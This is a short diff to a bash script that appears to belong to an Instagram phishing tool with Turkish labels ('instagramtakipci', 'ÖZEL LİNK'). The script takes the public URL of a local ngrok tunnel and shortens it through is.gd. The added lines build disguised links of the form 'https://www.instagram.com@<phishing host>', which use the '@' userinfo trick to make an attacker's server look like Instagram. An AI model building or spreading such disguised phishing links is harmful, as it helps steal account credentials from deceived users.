@@ -19,16 +19,19 @@ if [[ $1 == -bg ]];then
 		echo
 		echo
 		echo
-		printf "LİNK \e[31m>>\e[97m "
-		curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"'
-		echo
-		echo
-		echo
 		url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"')
-		curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="instagramtakipci$(date +%d%m%G%H%S)" > .ozellink.txt
-		ozellink=$(cat .ozellink.txt |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
-		printf "ÖZEL LİNK \e[31m>>\e[97m $ozellink "
-		rm .ozellink.txt
+		domain=$(echo -e "$url" |grep -o /[a-z.0-9.A-Z.]\*.ngrok.io |tr -d '/')
+		printf "LİNK 1 \e[31m>>\e[97m $url"
+		echo
+		echo
+		echo
+		printf "LİNK 2 \e[31m>>\e[97m https://www.instagram.com@$domain"
+		ozellink=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="instagramtakipci$(date +%d%m%G%H%S)")
+		link3=$(echo -e "$ozellink" |grep -o is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
+		echo
+		echo
+		echo
+		printf "LİNK 3 \e[31m>>\e[97m https://www.instagram.com@$link3 "
 		echo
 		echo
 		echo
